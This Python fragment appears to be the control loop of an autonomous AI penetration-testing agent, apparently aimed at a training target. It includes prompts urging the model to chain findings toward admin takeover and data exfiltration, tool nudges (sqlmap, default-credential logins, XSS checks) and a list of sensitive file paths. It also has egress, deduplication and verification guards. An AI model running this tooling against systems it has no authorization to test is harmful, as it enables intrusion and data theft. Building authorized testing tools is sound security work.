        self.state.add_message("user", (
            f"Target: {self.state.target}\n\n"
            "You are a senior penetration tester. Find as many vulnerabilities as possible. "
            "The more you find, the better. If there's even the slightest hint of a weakness, "
            "dig into it — fuzz it, chain it, escalate it until you hit a dead end. "
            "Use ALL your knowledge: OWASP Top 10, business logic flaws, auth bypasses, "
            "injection variants, misconfigurations, everything. "
            "Then chain your findings into attack paths that reach crown jewels "
            "(admin takeover, DB dump, RCE, data exfil). "
            "DO NOT stop early. DO NOT be satisfied with surface-level findings."
        ))
        await self._maybe_autostart_proxy()

        # Phase B fix: code-level anti-repetition. Track hash of (tool, args)
        # so we can detect when Brain is about to run an identical call a 3rd+
        # time and inject a synthetic "DEDUP" result instead of re-running.
        # This breaks the loop regardless of whether Brain's prompt adherence.
        _call_counts: dict[str, int] = {}

        # Phase B fix: baseline tracking + auto-finding extraction.
        # When Brain runs a probe that returns "status size path" rows, we
        # parse the output and inject a SYSTEM HINT message listing likely
        # findings. This compensates for gpt-5.4-mini's weak reason->action
        # linkage: Brain has all the data it needs but doesn't emit
        # report_finding on its own. The hint makes the conclusion explicit.
        _baseline_size: int | None = None
        _probe_row_re = _re.compile(
            r"^\s*(\d{3})\s+(\d+)\s*B?\s+[/]*([^\s]+)\s*$",
            _re.MULTILINE,
        )
        # Sticky hint: track candidates Brain still hasn't reported yet.
        # Keyed by (finding_type, affected_component) so we can check against
        # finding_tools store and drop items once Brain reports them.
        _pending_findings: dict[tuple[str, str], str] = {}
        # Track which iteration we last emitted a sticky re-injection on, so
        # multi-action iterations don't spam the same nudge N times.
        _sticky_last_iter: int = 0
        _focus_drift_count: int = 0
        _focus_branch_id: str = ""

        # Phase C: enterprise egress allowlist. No-op unless VXIS_EGRESS_STRICT=1.
        from vxis.agent.egress import build_allowlist, check_violations, is_strict_mode
        _egress_allowlist = build_allowlist(self.state.target)
        _egress_strict = is_strict_mode()
        if _egress_strict:
            logger.info("egress filter ENABLED — allowlist=%s", sorted(_egress_allowlist))

        _consecutive_empty = 0  # Track consecutive empty-action iterations
        # Phase C auto-orchestration flags
        _auto_browser_done = False
        _auto_nuclei_done = False
        _auto_login_done = False
        _tools_used: set[str] = set()
        # Phase E: skill auto-execution sequence
        _skill_sequence = [
            # Phase 1: Recon
            ("enumerate_endpoints", 3, {}),
            ("test_sensitive_files", 5, {}),
            ("test_infra", 6, {}),
            # Phase 2: Auth
            ("attempt_auth", 8, {}),
            # post_auth_enum + test_idor chained after auth success
            # Phase 3: Injection
            ("test_misconfig", 12, {}),
            ("test_csrf", 14, {}),
            ("test_crypto", 16, {}),
            ("test_api_security", 18, {}),
            ("test_business_logic", 20, {}),
            # test_injection + test_xss + test_ssrf chained after enumerate
            # test_auth_deep chained after auth (needs token)
        ]
        _skills_completed: set[str] = set()
        # Separate tracker: the *real* skill names that have actually been
        # dispatched (sweeps/aliases add _real_skill, not the alias). This
        # lets the sweep block at iter ≥ 25 see which registry skills were
        # never even attempted so it can force-queue them with defaults.
        _real_skills_completed: set[str] = set()
        _all_skill_names = {s[0] for s in _skill_sequence}
        _skill_promotion_replays: set[str] = set()
        _auth_token: str | None = None
        _priority_action_lane: tuple[str, dict[str, Any], str] | None = None
        # Phase 4: track every shell_exec / python_exec invocation so the
        # scoring layer can credit VC for sandbox-based attacks. Each entry
        # is {"tool": name, "cmd"|"code": str}. Brain gets rewarded for
        # creative sandbox use instead of penalized (prior behavior).
        _sandbox_invocations: list[dict[str, str]] = []

        def _queue_skill(skill_name: str, trigger_iter: int, params: dict[str, Any] | None = None, *, alias: str | None = None) -> bool:
            queue_params = dict(params or {})
            requested = str(queue_params.get("_skill_override") or skill_name).strip().lower()
            if not requested:
                return False
            rerouted, queue_params = self._reroute_blocked_skill(requested, queue_params)
            if not rerouted:
                logger.info(
                    "iter %d: skip queueing blocked skill=%s alias=%s",
                    self.state.iteration,
                    requested,
                    alias or skill_name,
                )
                return False
            if rerouted != requested:
                queue_params["_skill_override"] = rerouted
            elif queue_params.get("_skill_override") == requested:
                queue_params.pop("_skill_override", None)
            queue_name = alias or skill_name
            _skill_sequence.append((queue_name, trigger_iter, queue_params))
            _all_skill_names.add(queue_name)
            return True

        while not self.state.completed and self.state.iteration < self.state.max_iters:
            self.state.iteration += 1
            self._emit_iteration_status("Brain choosing next action")
            # LLM memory compression: when history grows beyond token
            # threshold, older messages are summarized by the LLM. Recent
            # messages preserved verbatim. Strix pattern.
            try:
                from vxis.agent.memory_compressor import compress_history
                self.state.messages = await compress_history(
                    self.state.messages, self.brain
                )
            except Exception:
                pass  # compression is best-effort
            if _priority_action_lane is not None:
                self.state.add_message("system", {
                    "hint": (
                        f"PRIORITY ACTION LANE: execute {_priority_action_lane[0]} next "
                        f"because the judge escalated this path: {_priority_action_lane[2]}"
                    ),
                })
                actions = [(_priority_action_lane[0], dict(_priority_action_lane[1]))]
                _priority_action_lane = None
            else:
                actions = await self._decide(self.state)
            if not actions:
                _consecutive_empty += 1
                _min_iters = min(50, self.state.max_iters // 2)
                if self.state.iteration < _min_iters and _consecutive_empty <= 2:
                    self.state.add_message("user", (
                        f"SYSTEM: You returned no actions at iteration "
                        f"{self.state.iteration}. Minimum {_min_iters} required. "
                        "You MUST keep scanning. Here are concrete next actions:\n"
                        f"1. browser_navigate(url=\"{self.state.target}/#/login\") "
                        "then browser_fill_form with default creds\n"
                        f"2. shell_exec(command=\"curl -s {self.state.target}/rest/products/search?q=test\")\n"
                        "3. load_playbook(name=\"injection_vectors\") if not loaded\n"
                        f"4. python_exec with httpx to test /api/Users, /api/Challenges, /api/SecurityQuestions"
                    ))
                    logger.warning(
                        "iter %d: no actions but below min=%d (empty=%d) — nudge",
                        self.state.iteration, _min_iters, _consecutive_empty,
                    )
                    self._emit_control_plane("Brain returned no action; injected a concrete nudge")
                    continue
                logger.warning("iter %d: no actions returned, stopping", self.state.iteration)
                self._emit_control_plane("Brain returned no action; stopping loop")
                break
            _consecutive_empty = 0  # Reset on successful action batch
            # Strix pattern: 1 tool call per message. Only execute the FIRST
            # action. Brain must see the result before deciding the next step.
            # This prevents "spray and pray" multi-action batches where Brain
            # fires 5 tools without reading any results.
            actions = actions[:1]
            for name, args in actions:
                args = self._normalize_tool_args(name, args)
                # Compute a stable hash key for the (tool, args) pair
                try:
                    key = f"{name}::{_json.dumps(args, sort_keys=True, default=str)}"
                except Exception:
                    key = f"{name}::{args!r}"

                _action_candidate_ids = self._candidate_ids_for_action(name, args)
                _action_branch_ids = self._branch_ids_for_action(name, args)
                if not _action_branch_ids and _action_candidate_ids:
                    _action_branch_ids = self._fallback_branch_ids_for_candidates(_action_candidate_ids)
                _focus_branch = self._focus_branch()
                if _focus_branch is None:
                    _focus_drift_count = 0
                    _focus_branch_id = ""
                elif _focus_branch.id != _focus_branch_id:
                    _focus_branch_id = _focus_branch.id
                    _focus_drift_count = 0
                _focus_related = self._action_advances_focus_branch(
                    _focus_branch,
                    name,
                    args,
                    _action_branch_ids,
                )
                _off_branch_allowed = self._should_allow_off_branch_action(
                    _focus_branch,
                    name,
                    args,
                    _action_branch_ids,
                    _action_candidate_ids,
                )
                if self._should_pressure_memory_revalidation(name, args, _action_branch_ids):
                    self.state.add_message("system", {
                        "hint": (
                            "MEMORY PRIORITY HINT: this target has prior confirmed leads or unfinished branches. "
                            "Revalidate one carry-over memory branch or memory-seeded candidate first, then explore new surface."
                        ),
                    })
                if _focus_branch and (_focus_related or _off_branch_allowed):
                    _focus_drift_count = 0
                count = _call_counts.get(key, 0) + 1
                _call_counts[key] = count

                if (
                    _focus_branch
                    and not _focus_related
                    and not _off_branch_allowed
                    and name != "finish_scan"
                    and _focus_branch.priority >= 85
                ):
                    _focus_drift_count += 1
                    _branch_summary = (
                        f"Focus branch { _focus_branch.id } [{_focus_branch.title}] "
                        f"role={_focus_branch.role} "
                        f"phase={_focus_branch.phase} "
                        f"objective={_focus_branch.objective[:100]} "
                        f"next={_focus_branch.next_step[:100]}"
                    )
                    _drift_msg = (
                        "BRANCH DISCIPLINE: your selected action does not advance the current "
                        f"highest-priority branch.\n\n{_branch_summary}\n\n"
                        "Strix-style rule: do not abandon a live exploit path just because a "
                        "new idea appeared. Stay on this branch until you either prove deeper "
                        "impact, hit a clear blocker, or spawn a stronger child branch."
                    )
                    if _focus_drift_count >= self._focus_drift_block_threshold():
                        self.state.add_message("tool", {
                            "name": name,
                            "args": args,
                            "result": {
                                "ok": False,
                                "summary": _drift_msg,
                                "data": {
                                    "focus_branch_blocked": True,
                                    "focus_branch": _focus_branch.to_dict(),
                                    "drift_count": _focus_drift_count,
                                },
                            },
                        })
                        logger.warning(
                            "iter %d: blocked off-branch action %s while focus=%s",
                            self.state.iteration,
                            name,
                            _focus_branch.id,
                        )
                        self._emit_control_plane(
                            f"Blocked off-branch action {name}; refocus on {_focus_branch.id}"
                        )
                        continue
                    self.state.add_message("system", {"hint": _drift_msg})
                    logger.info(
                        "iter %d: warned about off-branch action %s while focus=%s",
                        self.state.iteration,
                        name,
                        _focus_branch.id,
                    )

                if count >= 5 and name != "finish_scan":
                    # Third or later time we're seeing this exact call. Skip the
                    # real dispatch and inject a nudge message so Brain sees
                    # different context on the next iteration.
                    _remaining_skills = sorted(_all_skill_names - _skills_completed)
                    _completed_list = sorted(_skills_completed)
                    nudge = (
                        f"BLOCKED: {name} with same args was already called "
                        f"{count - 1} times. You MUST use a DIFFERENT tool now.\n"
                        f"Skills already completed: {', '.join(_completed_list) if _completed_list else 'none'}\n"
                        f"Skills NOT yet run: {', '.join(_remaining_skills) if _remaining_skills else 'all completed'}\n"
                        f"Options:\n"
                        f"  run_skill: try one of the untested skills above\n"
                        f"  shell_exec: sqlmap, nuclei, ffuf, nmap\n"
                        f"  browser_fill_form: try login with payloads\n"
                        f"  browser_eval_js: check tokens, test XSS\n"
                        f"  python_exec: custom HTTP fuzzing script\n"
                        f"  report_finding: report what you already discovered\n"
                        f"  finish_scan: if you believe scan is complete"
                    )
                    self.state.add_message("tool", {"name": name, "args": args, "result": {
                        "ok": False,
                        "summary": nudge,
                        "data": {"dedup": True, "prior_calls": count - 1},
                    }})
                    for _cid in _action_candidate_ids:
                        self.state.record_attempt_outcome(
                            _cid,
                            name,
                            args,
                            status="blocked",
                            summary=nudge,
                        )
                    for _bid in _action_branch_ids:
                        self.state.record_branch_attempt(
                            _bid,
                            name,
                            args,
                            status="blocked",
                            summary=nudge,
                            blocker="dedup guard",
                        )
                    logger.warning(
                        "iter %d: dedup-blocked repeated call: %s (count=%d)",
                        self.state.iteration, name, count,
                    )
                    self._emit_control_plane(f"Blocked repeated call: {name}")
                    continue

                # Phase C: egress filter — block shell/python/http commands
                # that reference off-allowlist hosts when strict mode is on.
                if _egress_strict and name in ("shell_exec", "python_exec", "http_request", "http_get", "http_post"):
                    blob = ""
                    if isinstance(args, dict):
                        blob = " ".join(str(v) for v in args.values() if v)
                    violations = check_violations(blob, _egress_allowlist)
                    if violations:
                        self.state.add_message("tool", {
                            "name": name, "args": args,
                            "result": {
                                "ok": False,
                                "summary": (
                                    f"EGRESS BLOCKED: command references off-allowlist host(s) "
                                    f"{violations}. Only these hosts are permitted: "
                                    f"{sorted(_egress_allowlist)}. Rewrite the command to target "
                                    f"the authorized scope only."
                                ),
                                "data": {"egress_blocked": True, "violations": violations},
                            },
                        })
                        logger.warning(
                            "iter %d: egress-blocked %s (violations=%s)",
                            self.state.iteration, name, violations,
                        )
                        for _cid in _action_candidate_ids:
                            self.state.record_attempt_outcome(
                                _cid,
                                name,
                                args,
                                status="blocked",
                                summary=f"egress blocked: {violations}",
                            )
                        for _bid in _action_branch_ids:
                            self.state.record_branch_attempt(
                                _bid,
                                name,
                                args,
                                status="blocked",
                                summary=f"egress blocked: {violations}",
                                blocker="egress allowlist",
                            )
                        self._emit_control_plane(f"Egress blocked for {name}: {', '.join(violations)}")
                        continue

                # Phase C: auto-evidence-enrichment for report_finding.
                # If evidence is thin (< 200 chars) and component looks like
                # a URL, auto-fetch it and prepend the response to evidence.
                if name == "report_finding" and isinstance(args, dict):
                    evidence = str(args.get("evidence", ""))
                    component = str(args.get("affected_component", ""))
                    if len(evidence) < 200 and component.startswith("http"):
                        try:
                            from vxis.interaction.hands import SessionManager as _SessionManager
                            _mgr = _SessionManager()
                            try:
                                _sess = await _mgr.get_session(component)
                                _resp = await _sess.request("GET", component)
                                _headers = list(_resp.headers.items())[:15]
                                _enriched = (
                                    f"HTTP {_resp.status}\n"
                                    + "\n".join(f"{k}: {v}" for k, v in _headers)
                                    + f"\n\n{_resp.text[:1500]}"
                                )
                                args["evidence"] = _enriched + "\n\n--- Original evidence ---\n" + evidence
                                logger.info("auto-enriched evidence for %s (%d → %d chars)",
                                           component, len(evidence), len(args["evidence"]))
                            finally:
                                await _mgr.close_all()
                        except Exception:
                            pass  # enrichment is best-effort

                if name == "verify_finding" and isinstance(args, dict):
                    args = self._hydrate_verify_finding_args(args)

                # Phase C: auto-verify HIGH/CRITICAL report_finding calls
                # before dispatch. If verify_finding is available in the
                # registry and the severity is high or critical, run the
                # adversarial check first. If REFUTED, block the report.
                if (
                    name == "report_finding"
                    and isinstance(args, dict)
                    and str(args.get("severity", "")).lower() in ("high", "critical")
                    and "verify_finding" in self.registry.list_tools()
                ):
                    try:
                        verify_args = {
                            "title": args.get("title", ""),
                            "severity": args.get("severity", ""),
                            "finding_type": args.get("finding_type", ""),
                            "affected_component": args.get("affected_component", ""),
                            "description": args.get("description", ""),
                            "impact": args.get("impact", ""),
                            "technical_analysis": args.get("technical_analysis", ""),
                            "poc_description": args.get("poc_description", ""),
                            "poc_script_code": args.get("poc_script_code", ""),
                            "evidence": args.get("evidence", ""),
                        }
                        if _baseline_size is not None:
                            verify_args["baseline_size"] = _baseline_size
                        verdict_result = await self.registry.dispatch("verify_finding", verify_args)
                        if verdict_result.ok:
                            verdict_data = verdict_result.data or {}
                            verdict = verdict_data.get("verdict", "UNCONFIRMED")
                            reasoning = str(verdict_data.get("reasoning", "")) or f"Verifier returned {verdict}."
                            confidence = str(verdict_data.get("confidence", "low"))
                            # Phase C belief state: track verdict counts
                            self.state.verdict_counts[verdict] = self.state.verdict_counts.get(verdict, 0) + 1
                            _belief_entry = {
                                "iter": self.state.iteration,
                                "title": args.get("title", ""),
                                "severity": args.get("severity", ""),
                                "finding_type": args.get("finding_type", ""),
                                "affected_component": args.get("affected_component", ""),
                                "confidence": confidence,
                                "reasoning": reasoning[:300],
                            }
                            if verdict == "CONFIRMED":
                                self.state.confirmed_findings.append(_belief_entry)
                            elif verdict == "UNCONFIRMED":
                                pass
                            elif verdict == "REFUTED":
                                self.state.refuted_findings.append(_belief_entry)
                            self._record_verifier_decision(
                                args=args,
                                verdict=verdict,
                                reasoning=reasoning,
                                confidence=confidence,
                            )
                            self.state.add_message("tool", {
                                "name": "verify_finding",
                                "args": verify_args,
                                "result": {
                                    "ok": True,
                                    "summary": verdict_result.summary,
                                    "data": verdict_data,
                                },
                            })
                            logger.info(
                                "iter %d: auto-verify for %s severity=%s → %s",
                                self.state.iteration,
                                args.get("affected_component", "?"),
                                args.get("severity", "?"),
                                verdict,
                            )
                            if verdict == "REFUTED":
                                # Block the report_finding dispatch — treat
                                # as a soft fail so Brain sees the refutation
                                # reasoning on next iteration.
                                self.state.add_message("tool", {
                                    "name": "report_finding",
                                    "args": args,
                                    "result": {
                                        "ok": False,
                                        "summary": (
                                            "report_finding BLOCKED by auto-verifier "
                                            "(REFUTED). Reason: "
                                            + str(verdict_data.get("reasoning", ""))[:300]
                                        ),
                                        "data": {"verifier_blocked": True, "verdict": verdict},
                                    },
                                })
                                logger.warning(
                                    "iter %d: report_finding BLOCKED (REFUTED) for %s",
                                    self.state.iteration,
                                    args.get("affected_component", "?"),
                                )
                                self._emit_control_plane(
                                    f"Auto-verifier refuted finding: {args.get('title', 'report_finding')}"
                                )
                                continue
                    except Exception:
                        logger.exception("auto-verify failed — proceeding with report_finding")

                if name == "report_finding" and isinstance(args, dict):
                    _refuted_match = self._matches_refuted_memory_pattern(args)
                    if _refuted_match is not None:
                        _reason = (
                            "report_finding BLOCKED by target memory: this same finding_type/component "
                            "was previously refuted on this target. Bring materially different evidence "
                            "before reporting it again."
                        )
                        self.state.record_review_decision(
                            stage="memory",
                            verdict="SUPPRESSED",
                            title=str(args.get("title", "memory-suppressed finding")),
                            reason=_reason,
                            action_hint="Reproduce with stronger control evidence or pivot to a different branch.",
                            blocked_action="report_finding",
                            affected_component=str(args.get("affected_component", "")),
                            source_finding_type=str(args.get("finding_type", "")),
                        )
                        self.state.add_message("tool", {
                            "name": "report_finding",
                            "args": args,
                            "result": {
                                "ok": False,
                                "summary": _reason,
                                "data": {
                                    "memory_suppressed": True,
                                    "refuted_pattern": _refuted_match,
                                },
                            },
                        })
                        self._emit_control_plane("Memory suppressed a previously refuted finding pattern")
                        continue

                # Phase Q: dispatch-level surface guard. The desktop preamble
                # in build_agent_system_prompt tells Brain "DO NOT call web
                # skills" but the LLM ignores it on ~30% of desktop iters and
                # fires test_infra / test_csrf / test_xss at file:// paths,
                # producing false positives like cloud_metadata. Block at
                # dispatch time and feed the rule back into the chat so Brain
                # re-plans toward a desktop skill.
                if (
                    name == "run_skill"
                    and isinstance(args, dict)
                    and self._target_kind == _TK.DESKTOP
                ):
                    _requested_skill = str(args.get("skill") or "").strip()
                    if _requested_skill and _requested_skill not in _DESKTOP_SKILLS:
                        _block_msg = (
                            f"blocked: web skill '{_requested_skill}' on desktop target "
                            f"— surface guard refused dispatch. Use one of: "
                            f"{', '.join(sorted(_DESKTOP_SKILLS))}"
                        )
                        self.state.add_message("tool", {
                            "name": "run_skill",
                            "args": args,
                            "result": {
                                "ok": False,
                                "summary": _block_msg,
                                "data": {
                                    "surface_guard_blocked": True,
                                    "requested_skill": _requested_skill,
                                    "target_kind": "desktop",
                                    "allowed_skills": sorted(_DESKTOP_SKILLS),
                                },
                            },
                        })
                        self.state.add_message("system", {
                            "hint": (
                                f"SYSTEM HINT: target is a macOS .app bundle (file://). "
                                f"Web skill '{_requested_skill}' cannot apply. "
                                f"Pick a desktop skill: {', '.join(sorted(_DESKTOP_SKILLS - _real_skills_completed))}"
                            ),
                        })
                        logger.warning(
                            "iter %d: surface_guard BLOCKED run_skill=%s on desktop target",
                            self.state.iteration,
                            _requested_skill,
                        )
                        for _cid in _action_candidate_ids:
                            self.state.record_attempt_outcome(
                                _cid,
                                name,
                                args,
                                status="blocked",
                                summary=_block_msg,
                            )
                        for _bid in _action_branch_ids:
                            self.state.record_branch_attempt(
                                _bid,
                                name,
                                args,
                                status="blocked",
                                summary=_block_msg,
                                blocker="surface guard",
                            )
                        self._emit_control_plane(_block_msg)
                        continue

                if name in {"run_skill", "report_finding"}:
                    _memory_refuted_action = self._matches_refuted_memory_action(name, args)
                    if _memory_refuted_action is not None:
                        _memory_block_msg = (
                            f"MEMORY BLOCKED: repeated refuted "
                            f"{_memory_refuted_action.get('finding_type', 'finding')} pattern on "
                            f"{_memory_refuted_action.get('affected_component', 'the same component')}. "
                            f"Reason: {str(_memory_refuted_action.get('reasoning', '') or 'prior scan refuted it.')[:180]} "
                            f"Choose a deeper pivot or a materially different control pair."
                        )
                        self.state.add_message("tool", {
                            "name": name,
                            "args": args,
                            "result": {
                                "ok": False,
                                "summary": _memory_block_msg,
                                "data": {
                                    "memory_suppressed": True,
                                    "refuted_pattern": _memory_refuted_action,
                                    "blocked_stage": "action",
                                },
                            },
                        })
                        self.state.record_review_decision(
                            stage="memory",
                            verdict="SUPPRESSED",
                            title=str(_memory_refuted_action.get("title") or _memory_refuted_action.get("finding_type") or name),
                            reason=str(_memory_refuted_action.get("reasoning", "") or "Repeated refuted pattern."),
                            blocked_action=name,
                            affected_component=str(_memory_refuted_action.get("affected_component", "")),
                            source_finding_type=str(_memory_refuted_action.get("finding_type", "")),
                        )
                        for _cid in _action_candidate_ids:
                            self.state.record_attempt_outcome(
                                _cid,
                                name,
                                args,
                                status="blocked",
                                summary=_memory_block_msg,
                            )
                        for _bid in _action_branch_ids:
                            self.state.record_branch_attempt(
                                _bid,
                                name,
                                args,
                                status="blocked",
                                summary=_memory_block_msg,
                                blocker="memory refuted pattern",
                            )
                        self._emit_control_plane(_memory_block_msg)
                        continue

                _memory_success = self._matching_successful_memory_tactic(name, args)
                if _memory_success is not None and self.state.iteration <= 8:
                    self.state.add_message("system", {
                        "hint": (
                            f"MEMORY TACTIC HINT: prior scan confirmed "
                            f"{_memory_success.get('finding_type', 'this tactic')} on "
                            f"{_memory_success.get('affected_component', 'this surface')}. "
                            f"Revalidate quickly with fresh transcript, then go deeper than before."
                        ),
                    })

                if name == "finish_scan":
                    _recent_finish_rejections = self._recent_finish_rejections(limit=3)
                    if len(_recent_finish_rejections) >= 2:
                        _latest_titles = {item.title for item in _recent_finish_rejections[-2:]}
                        _latest_title = next(iter(_latest_titles)) if _latest_titles else ""
                        if len(_latest_titles) == 1 and _latest_title in {"needs_chains", "unfinished_branches", "unattempted_candidates"}:
                            _chain_candidates = self._suggest_chain_candidates(limit=3)
                            _auto_linked = await self._maybe_auto_link_suggested_chain()
                            _forced_action = self._forced_replan_action(_latest_title)
                            _replan_hint = self._judge_replan_hint()
                            _candidate_text = ""
                            _auto_link_text = ""
                            _forced_text = ""
                            if _auto_linked is not None:
                                _auto_link_text = (
                                    f" Auto-linked { _auto_linked['source_id'] } -> { _auto_linked['target_id'] } "
                                    f"toward {_auto_linked['crown_jewel']}."
                                )
                            if _forced_action is not None:
                                _forced_text = f" Forced next action: {_forced_action[0]} ({_forced_action[2]})."
                            if _chain_candidates:
                                _candidate_lines = [
                                    f"{item['source_id']} -> {item['target_id']} ({item['crown_jewel']})"
                                    for item in _chain_candidates
                                ]
                                _candidate_text = " Suggested chain candidates: " + "; ".join(_candidate_lines) + "."
                            _replan_msg = (
                                "JUDGE REPLAN REQUIRED: finish_scan was rejected repeatedly for the same reason. "
                                f"Last rejection: {_latest_title}.{_auto_link_text}{_forced_text} {_replan_hint}{_candidate_text}"
                            )
                            self.state.add_message("tool", {
                                "name": "finish_scan",
                                "args": args,
                                "result": {
                                    "ok": False,
                                    "summary": _replan_msg,
                                    "data": {
                                        "judge_replan_required": True,
                                        "last_rejection_title": _latest_title,
                                        "auto_linked_chain": _auto_linked,
                                        "chain_candidates": _chain_candidates,
                                        "forced_action": {
                                            "tool": _forced_action[0],
                                            "args": _forced_action[1],
                                            "reason": _forced_action[2],
                                        } if _forced_action is not None else None,
                                    },
                                },
                            })
                            self.state.add_message("system", {
                                "hint": f"SYSTEM HINT: {_replan_hint}",
                            })
                            for _cid in _action_candidate_ids:
                                self.state.record_attempt_outcome(
                                    _cid,
                                    name,
                                    args,
                                    status="blocked",
                                    summary=_replan_msg,
                                )
                            for _bid in _action_branch_ids:
                                self.state.record_branch_attempt(
                                    _bid,
                                    name,
                                    args,
                                    status="blocked",
                                    summary=_replan_msg,
                                    blocker="judge replan required",
                                )
                            self._emit_control_plane(_replan_msg)
                            if _forced_action is not None:
                                _priority_action_lane = _forced_action
                                name, args = _forced_action[0], _forced_action[1]
                            else:
                                continue

                self._emit_action_progress(name, args, "Executing")
                result = await self.registry.dispatch(name, args)
                if name == "run_skill" and isinstance(args, dict) and not result.ok:
                    _data = result.data if isinstance(result.data, dict) else {}
                    if _data.get("blocked"):
                        self.state.record_blocked_skill(str(args.get("skill") or ""))
                self.state.add_message("tool", {"name": name, "args": args, "result": {
                    "ok": result.ok, "summary": result.summary, "data": result.data,
                }})
                for _cid in _action_candidate_ids:
                    self.state.record_attempt_outcome(
                        _cid,
                        name,
                        args,
                        status=self._status_from_tool_result(result),
                        summary=result.summary,
                    )
                for _bid in _action_branch_ids:
                    self.state.record_branch_attempt(
                        _bid,
                        name,
                        args,
                        status=self._status_from_tool_result(result),
                        summary=result.summary,
                    )
                self.state.clear_waiting_reason()
                self._emit_control_plane(f"Result: {result.summary}")
                if name == "report_finding" and result.ok and isinstance(args, dict):
                    self._mark_candidates_for_finding(args)
                    finding_id = ""
                    if isinstance(result.data, dict):
                        finding_id = str(result.data.get("id") or "")
                    if finding_id:
                        self._spawn_followup_branches_from_finding(finding_id, args)
                        await self._maybe_auto_link_chain(finding_id)

                # Phase Q10: credit Brain-direct run_skill calls so VC isn't
                # blind to LLM initiative. Pre-Q10 only the auto-exec ladder
                # (line ~1193) populated _real_skills_completed, so when Brain
                # picked test_signature_audit on its own the pipeline's
                # _DESKTOP_SKILL_TO_VECTORS lookup found nothing → VC=0
                # despite real skill execution (Q9 smoke proof).
                if (
                    name == "run_skill"
                    and result.ok
                    and isinstance(args, dict)
                ):
                    _real_sk = str(args.get("skill") or "").strip()
                    if _real_sk:
                        _real_skills_completed.add(_real_sk)
                        _skills_completed.add(_real_sk)
                        if isinstance(result.data, dict):
                            await self._promote_direct_run_skill_result(_real_sk, result.data)
                        _promote_alias = f"promote::{_real_sk}::iter{self.state.iteration}"
                        if _promote_alias not in _skill_promotion_replays:
                            _skill_promotion_replays.add(_promote_alias)
                            _promote_params = dict(args.get("params") or {})
                            _promote_params["_skill_override"] = _real_sk
                            _queue_skill(
                                _real_sk,
                                self.state.iteration + 1,
                                _promote_params,
                                alias=_promote_alias,
                            )

                # Phase 4: record sandbox invocations for VC scoring.
                # Every shell_exec / python_exec call — whether ok or not —
                # counts as an attempt so that VC reflects Brain's explored
                # surface, not only successful runs.
                if name in ("shell_exec", "python_exec"):
                    _inv: dict[str, str] = {"tool": name}
                    _cmd_val = args.get("command") or args.get("cmd") or ""
                    _code_val = args.get("code") or ""
                    if _cmd_val:
                        _inv["cmd"] = str(_cmd_val)
                    if _code_val:
                        _inv["code"] = str(_code_val)
                    if _inv.get("cmd") or _inv.get("code"):
                        _sandbox_invocations.append(_inv)

                # Phase B: auto-extract findings from probe output. If the tool
                # output looks like a path-size-status probe result, parse it,
                # diff against baseline, and inject a SYSTEM HINT nudging Brain
                # to call report_finding on the real finds.
                if name in ("python_exec", "shell_exec") and result.ok:
                    stdout = ""
                    if isinstance(result.data, dict):
                        stdout = str(result.data.get("stdout", ""))
                    rows = _probe_row_re.findall(stdout)
                    if rows and len(rows) >= 3:
                        # Update baseline if we see the SPA shell size showing up repeatedly
                        sizes = [int(s) for _, s, _ in rows]
                        if _baseline_size is None:
                            # Assume the most common size is the SPA shell
                            from collections import Counter
                            common = Counter(sizes).most_common(1)
                            if common and common[0][1] >= 3:
                                _baseline_size = common[0][0]

                        findings_hint: list[str] = []
                        seen: set[tuple[str, str]] = set()

                        # First pass: collect per-base-path sizes for query-param
                        # diff detection (SQL injection / XSS / IDOR via response-
                        # length oracle)
                        path_sizes: dict[str, list[tuple[str, int, str]]] = {}
                        for code, size_s, path in rows:
                            base = path.split("?", 1)[0].rstrip("/")
                            path_sizes.setdefault(base, []).append((code, int(size_s), path))

                        # Second pass: per-row heuristics
                        for code, size_s, path in rows:
                            size = int(size_s)
                            key = (code, path)
                            if key in seen:
                                continue
                            seen.add(key)
                            code_i = int(code)
                            norm_path = "/" + path.lstrip("/")
                            lower = norm_path.lower()

                            if code_i == 500:
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → HTTP 500 = potential injection/logic bug (severity=high, finding_type=information_disclosure)"
                                )
                            elif code_i == 401 and "basket" in lower:
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → auth-protected enumerable resource = IDOR candidate (severity=medium, finding_type=broken_access_control)"
                                )
                            elif code_i == 403 and any(x in lower for x in (".bak", ".old", ".backup", "~")):
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → backup file accessible via bypass = info disclosure (severity=medium, finding_type=information_disclosure)"
                                )
                            elif code_i == 200 and "/ftp" in lower and _baseline_size and size != _baseline_size:
                                # FTP directory — Juice Shop classic
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → directory listing exposed (size differs from shell {_baseline_size}) (severity=medium, finding_type=information_disclosure)"
                                )
                            elif code_i == 200 and _baseline_size is not None and size != _baseline_size and size > 100:
                                sensitive = any(x in lower for x in (
                                    "admin", "config", "api-doc", "swagger", "graphql",
                                    ".git", ".env", "actuator", "debug", "backup",
                                    "rest/admin", "rest/user", "rest/basket", "rest/order",
                                    "rest/memories", "rest/captcha", "rest/languages",
                                    "registration", "h2-console", "server-status",
                                    "phpinfo", "wp-config", "wp-login", "wp-admin",
                                    "phpmyadmin", "heapdump", "beans", "configprops",
                                ))
                                if sensitive:
                                    # Critical-level paths get HIGH, others MEDIUM
                                    critical_markers = (
                                        "admin", "config", ".git", ".env", "actuator",
                                        "heapdump", "phpinfo", "wp-config", "h2-console",
                                    )
                                    sev = "high" if any(x in lower for x in critical_markers) else "medium"
                                    findings_hint.append(
                                        f"  - {code} {size}B {norm_path} → sensitive endpoint returning {size}B (differs from SPA shell {_baseline_size}B) (severity={sev}, finding_type=information_disclosure)"
                                    )

                        # Third pass: query-param response-length oracle (SQL injection)
                        for base, entries in path_sizes.items():
                            if len(entries) < 2 or not base:
                                continue
                            # Collect distinct sizes for this base
                            distinct = {s for _, s, _ in entries}
                            if len(distinct) < 2:
                                continue
                            # Find the max (benign) and min (injection break) sizes
                            max_row = max(entries, key=lambda e: e[1])
                            min_row = min(entries, key=lambda e: e[1])
                            if max_row[1] - min_row[1] < 500:
                                continue  # not a meaningful size delta
                            if min_row[1] < 100 or max_row[1] > 1000:
                                # min likely empty response, max likely real data
                                findings_hint.append(
                                    f"  - query-param oracle on {base}: {min_row[0]} {min_row[1]}B for '{min_row[2]}' vs {max_row[0]} {max_row[1]}B for '{max_row[2]}' → response-length oracle suggests SQL/NoSQL injection or parameter handling bug (severity=high, finding_type=sql_injection)"
                                )

                        # Update the sticky pending-findings map so we can
                        # re-inject unreported items on future iterations.
